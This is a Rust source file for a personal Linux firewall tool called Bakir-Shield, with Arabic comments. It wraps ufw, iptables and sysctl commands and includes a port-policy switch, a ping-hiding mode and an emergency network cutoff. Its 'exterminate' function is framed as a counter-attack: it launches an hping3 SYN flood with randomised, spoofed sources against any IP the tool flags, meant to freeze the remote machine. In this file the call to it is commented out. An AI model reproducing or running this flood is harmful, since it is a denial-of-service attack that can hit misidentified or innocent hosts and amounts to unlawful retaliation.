use std::process::{Command, Stdio};
use std::env;
use std::thread;
use std::time::Duration;

fn send_bakir_notification(title: &str, message: &str, urgency: &str) {
    // إرسال إشعار احترافي (عادي أو حرج)
    let _ = Command::new("sudo")
        .args(&["-u", "bakir", "DISPLAY=:0", "DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus", 
                "notify-send", title, message, "-i", "security-high", "-u", urgency])
        .status();
}

// وظيفة الإبادة (Counter-Attack) - للهجوم المضاد
fn exterminate(target_ip: &str) {
    send_bakir_notification("💀 ردع سيادي", &format!("تم رصد متسلل: {}. جاري تدمير الجلسة...", target_ip), "critical");
    
    // 1. الحظر الجراحي (IP Blackhole)
    let _ = Command::new("sudo").args(&["iptables", "-I", "INPUT", "-s", target_ip, "-j", "DROP"]).status();
    
    // 2. القنبلة الحرارية (إرسال حزم تعطل معالج المهاجم إذا استقبلها)
    // نستخدم hping3 لإغراق المهاجم بحزم تجمد جهازه
    let _ = Command::new("sudo").args(&["hping3", "--flood", "--rand-source", "-S", "-p", "80", target_ip]).spawn();
    
    println!("🔥 تم شن الهجوم المضاد على الـ IP: {}", target_ip);
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 || args.contains(&"-h".to_string()) || args.contains(&"--help".to_string()) {
        display_help();
        return;
    }

    match args[1].as_str() {
        "-all" => {
            let action = if args.contains(&"off".to_string()) { "deny" } else { "allow" };
            let _ = Command::new("sudo").args(&["ufw", "default", action, "incoming"]).status();
            let _ = Command::new("sudo").args(&["ufw", "--force", "enable"]).status();
            send_bakir_notification("🛡️ حصن باكير", "تم تحديث السياسة الشاملة للمنافذ.", "normal");
        },
        "-port" => {
            if args.len() >= 4 {
                let action = if args[3] == "on" { "allow" } else { "deny" };
                let _ = Command::new("sudo").args(&["ufw", action, &args[2]]).status();
                send_bakir_notification("🛡️ حصن باكير", &format!("تحديث المنفذ {}: {}", args[2], args[3]), "normal");
            }
        },
        "-ghost" => {
            let val = if args.contains(&"on".to_string()) { "1" } else { "0" };
            let _ = Command::new("sudo").args(&["sysctl", "-w", &format!("net.ipv4.icmp_echo_ignore_all={}", val)]).status();
            send_bakir_notification("👻 وضع الشبح", if val == "1" { "النظام الآن متخفٍ." } else { "النظام الآن مرئي." }, "normal");
        },
        "-guard" => {
            println!("📡 تفعيل 'الحارس الانتحاري'... بانتظار أي حماقة من هكر.");
            send_bakir_notification("📡 حارس باكير", "وضع الردع التلقائي نشط الآن.", "normal");
            
            // محاكاة مراقبة السجلات (هنا يكمن الذكاء)
            // في النسخة النهائية سنقوم بعمل Parse لملف /var/log/auth.log
            println!("🛡️ مراقبة محاولات الاختراق الجارية...");
            // مثال لمحاكاة رصد IP مهاجم (للتوضيح فقط)
            // exterminate("192.168.1.50"); 
        },
        "-redbutton" => {
            println!("🚨 تفعيل زر الطوارئ! قطع جميع الاتصالات...");
            let _ = Command::new("sudo").args(&["ufw", "deny", "out", "to", "any"]).status();
            let _ = Command::new("sudo").args(&["ufw", "deny", "in", "from", "any"]).status();
            send_bakir_notification("🚨 زر الطوارئ", "تم عزل النظام بالكامل عن الشبكة!", "critical");
        },
        _ => println!("❌ أمر غير معروف. استخدم bakir-shield -h للمساعدة."),
    }
}

fn display_help() {
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("   ⚔️ درع باكير العسكري | Bakir-Shield v2.5   ");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!(" [ الأوامر القتالية ]:");
    println!("  • bakir-shield -all on/off      : التحكم الشامل");
    println!("  • bakir-shield -port [رقم] on/off : التحكم بمنفذ");
    println!("  • bakir-shield -ghost on/off    : وضع التخفي");
    println!("  • bakir-shield -guard           : الحارس الردعي (تلقائي)");
    println!("  • bakir-shield -redbutton       : إبادة الاتصالات (عزل)");
    println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    println!("⚠️ تحذير: أي محاولة اختراق ستواجه برد فعل مدمر.");
}
